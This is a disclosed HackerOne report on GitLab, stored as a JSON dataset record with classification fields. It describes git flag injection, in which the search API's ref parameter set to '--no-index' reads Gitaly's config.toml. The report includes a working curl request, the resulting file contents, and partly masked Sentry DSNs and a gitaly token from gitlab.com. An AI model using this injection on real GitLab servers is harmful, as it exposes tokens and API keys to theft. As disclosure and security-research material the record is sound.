{
    "reported_to": "GitLab",
    "reported_by": "vakzz ",
    "title": "Git flag injection - Search API with scope 'blobs' ",
    "content": "\nAs requested from @hackerjuan, breaking this out of https://hackerone.com/reports/658013 for easier tracking.\nSummary\nGitlab 12.1.6 fixed the wiki_blobs scope of the search api, but the blobs scope is still vulnerable to git flag injection and allows reading any file in /var/opt/gitlab/gitaly including config.toml.\nSteps to reproduce\nMake a search API call setting the ref parameter to --no-index, search to a common character such as . or a, and scope to blobs:\nCode 887 Bytes\n1curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index\n2\n3[{\"basename\":null,\"data\":\"VERSION\\u00001\\u0000Gitaly, version 1.53.2\\n\",\"filename\":null,\"id\":null,\"ref\":\"--no-index\",\"startline\":0,\"project_id\":4},{\"basename\":null,\"data\":\"config.toml\\u00001\\u0000# Gitaly configuration file\\nconfig.toml\\u00002\\u0000# This file is managed by gitlab-ctl. Manual changes will be\\nconfig.toml\\u00003\\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\\nconfig.toml\\u00004\\u0000# and run:\\nconfig.toml\\u00005\\u0000# sudo gitlab-ctl reconfigure\\nconfig.toml\\u00006\\u0000\\nconfig.toml\\u00007\\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\\nconfig.toml\\u00008\\u0000bin_dir = '/opt/gitlab/embedded/bin'\\nconfig.toml\\u00009\\u0000\\n\",\"filename\":null,\"id\":null,\"ref\":\"--no-index\",\"startline\":0,\"project_id\":4}]\nThe ref parameter ends up being passed to git grep and setting it to --no-index includes the current working directory and files not managed by git:\nCode 269 Bytes\n1/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index\nImpact\nThe config.toml can contain sensitive information, api keys and tokens. For example on gitlab.com it contain the sentry.io api tokens as well as the gitaly token:\nCode 335 Bytes\n1https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index\n2\n3sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16\n4ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29\n5\n6token = 'yfZTE0Oxxxxxxx'\nI haven't looked into what is possible with the above tokens as potentially there is sensitive information in sentry.io.\nLet me know if you have any questions or require any other information.\nCheers,\nWill\nImpact\nRead access to any file in /var/opt/gitlab/gitaly including config.toml which may contain sensitive information, tokens, and API keys\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 7000,
    "weaknesses": [
        "Command Injection - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1576459260,
    "report_url": "https://hackerone.com/reports/682442",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Make a search API call setting the ref parameter to --no-index, search to a common character such as . or a, and scope to blobs"
        ],
        [
            2,
            "The ref parameter ends up being passed to git grep and setting it to --no-index includes the current working directory and files not managed by git"
        ]
    ],
    "vuln_description": "Git flag injection in the search API with scope 'blobs' allows reading any file in /var/opt/gitlab/gitaly, including config.toml which may contain sensitive information like API keys and tokens.",
    "reason": "The vulnerability involves understanding how the ref parameter is passed to git grep and how the --no-index flag affects the search behavior. While the interaction is non-obvious, the attack itself is straightforward once the flag injection is discovered.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "658013",
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves passing git flags through the 'ref' parameter in a search API call, which is not directly related to user sessions or resource IDs. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to this specific flag injection vulnerability.",
        "is_detectable": false
    }
}